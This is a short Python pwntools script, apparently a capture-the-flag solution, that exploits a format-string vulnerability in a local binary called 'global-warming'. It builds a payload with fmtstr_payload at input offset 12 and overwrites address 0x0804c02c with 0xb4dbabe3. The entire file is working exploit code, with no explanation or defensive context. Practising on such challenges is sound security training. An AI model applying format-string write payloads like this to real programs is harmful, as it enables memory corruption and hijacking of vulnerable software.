from pwn import *

elf = context.binary = ELF("./global-warming", checksec=False)
io = elf.process()

offset_to_input = 12

w = {0x0804c02c:0xb4dbabe3}

payload = fmtstr_payload(offset_to_input, w)

io.sendline(payload)

io.recvline(timeout=3)
print(io.recvline(timeout=3))
